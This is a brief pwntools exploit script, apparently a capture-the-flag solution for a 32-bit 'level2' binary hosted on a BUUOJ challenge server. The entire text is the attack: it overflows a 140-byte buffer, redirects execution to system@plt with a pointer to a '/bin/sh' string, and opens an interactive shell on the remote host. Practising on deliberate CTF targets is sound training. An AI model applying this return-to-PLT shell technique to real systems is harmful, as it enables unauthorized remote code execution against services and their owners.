#Made by fly_autumn
#x86 ret2rop nogets
from pwn import *
#p = process("./level2")
p = remote("node5.buuoj.cn",26154)
elf = ELF("./level2")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux",arch="i386")

sys_plt = elf.plt["system"]
sh_plt = 0x804a024

offset = 140
payload = b"\x00" * offset + p32(sys_plt) + p32(0) + p32(sh_plt)
p.recvuntil(b":")
p.sendline(payload)

p.interactive()
